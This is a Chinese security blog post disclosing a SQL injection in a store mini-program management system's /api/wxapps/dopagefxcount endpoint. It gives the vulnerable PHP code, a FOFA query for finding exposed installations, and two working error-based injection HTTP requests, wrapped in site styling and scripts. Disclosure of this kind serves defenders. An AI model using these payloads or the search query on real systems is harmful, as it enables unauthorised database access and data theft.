---
title: "万能门店小程序管理系统 /api/wxapps/dopagefxcount SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-dopagefxcount-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopagefxcount-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/dopagefxcount SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/16 18:18
* 508浏览
* [0评论](#comment)
* 20分钟阅读

深入探索

网络安全培训

授权

编程语言教程


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/dopagefxcount 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入检测工具

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

网络安全课程

文本剥离工具

网络安全会议

application/api/controller/Wxapps.php

```
    // 分销订单数据统计
    public function dopagefxcount()
    {
        $uniacid = input("uniacid");
        $suid = input("suid");
        $prefix = config('database.prefix');
        $orders1 = count(Db::query("SELECT * FROM {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and flag = 1 and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $orders2 = count(Db::query("SELECT * FROM {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and flag = 2 and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $orders3 = count(Db::query("SELECT * FROM {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and flag = 3 and (parent_id = '" . $suid . "' or {$prefix}p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $data = array(
            "onecount" => $orders1,
            "twocount" => $orders2,
            "threecount" => $orders3,
            "total" => $orders1 + $orders2 + $orders3
        );
        $result['data'] = $data;
        return json_encode($result);
    }
```

深入探索

安全研究工具

Web安全书籍

数据库

`$uniacid` 和 `$suid` 直接拼接进SQL语句，从而造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/dopagefxcount HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/dopagefxcount SQL 注入漏洞](images/img-001-645250d9dddb.webp)](https://image.mrxn.net/68fc652614054bbfb4fbe5afdd81383c.webp)

```
POST /api/wxapps/dopagefxcount HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

suid=1'+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)+and+'1'='1&uniacid=1
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/dopagefxcount SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-dopagefxcount-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-dopagefxcount-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-dopagefxcount-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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